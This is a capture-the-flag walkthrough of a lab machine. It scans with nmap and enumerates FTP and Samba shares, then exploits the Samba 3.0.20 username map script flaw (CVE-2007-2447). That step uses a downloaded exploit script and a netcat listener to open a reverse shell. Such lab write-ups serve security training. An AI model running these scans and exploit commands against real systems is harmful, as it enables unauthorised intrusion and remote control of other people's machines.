First things first, I did a full nmap scan to see which services are running and which ports are on

```
nmap -A -Pn -T4 -p- 10.129.158.251
```

![[Pasted image 20250110130356.png]]

-A : aggressive scan (enable OS detection, version detection, script scanning, and traceroute.)

-Pn : do not ping the host

-T4 : fast but still can be a bit stealthy

-p- : scan all ports

  
(-T0 = slow and stealthy | -T1 = a bit more faster but still slow| -T2 = moderate speed | -T3 = Diffault speed | -T4 = fast but still can be a bit stealthy | -T5 = insanely fast and not stealthy at all)  
 

Findings :

 port 21. running an ftp server with version vsftpd 2.3.4 and allowing anonymous login.  
 port 22. SSH service with OpenSSH 4.7p1
port 139&445. running samba with version 3.0.20

Enumeration of port 21

I tried anonymous login but found nothing.

```
ftp 10.129.158.251
```

![[Pasted image 20250110130504.png]]

Then I tried enumerating samba with enum4linux. It's a cool tool which gives information us about shares, drive permissions etc.

```
enum4linux -a 10.129.158.251
```

-a denotes "do all the things for enumerating"

![[Pasted image 20250110130525.png]]

The tmp directory is interesting. Let's dig deeper!  
  
SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands.

```
smbmap -H 10.129.158.251
```

-H : Host

![[Pasted image 20250110130544.png]]


That directory has read and write permissions. Next step will be connecting to it and try to find if it has any valuable information.

```
smbclient -N //10.129.158.251/tmp --option="Client Min Protocol=NT1"
```

![[Pasted image 20250110130619.png]]

There seems we have nothing interesting here.

Tthe next thing I tried was trying to find a vulnerability on Samba via searchsploit. Samba has version 3.0.20 let's try that :

```
searchsploit samba 3.0.20
```

![[Pasted image 20250110130642.png]]

Let's copy the Samba 3.0.20 < 3.0.25rc3 - 'Username map script' Comand Execution (Metasploit) and open it with our text editor nano :

```
searchsploit -m 16320.rb
```

```
nano 16320.rb
```

![[Pasted image 20250110130844.png]]

There is a vulnerability on Samba 3.0.20 and cited as "CVE 2007-2447" allowing a remote code execution which exploits the versions 3.0.20 through 3.0.25rc3 of Samba. Since this is written for metasploit I don't want to use it instead googling "CVE 2007-2447 exploit" led me to the following github page :

[https://github.com/amriunix/CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447)

The usage of the script is given as :

```
python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
```

Exploitation

After downloading the code into my kali, I made mode the exploit executable and created a nc listener. The final step was only running the code.

```
chmod +x exploit.py
```

```
nc -lvnp 8282
```

```
python3 exploit.py 10.129.158.251 445 10.10.14.33 8282
```

And boom!

![[Pasted image 20250110131002.png]]


QED!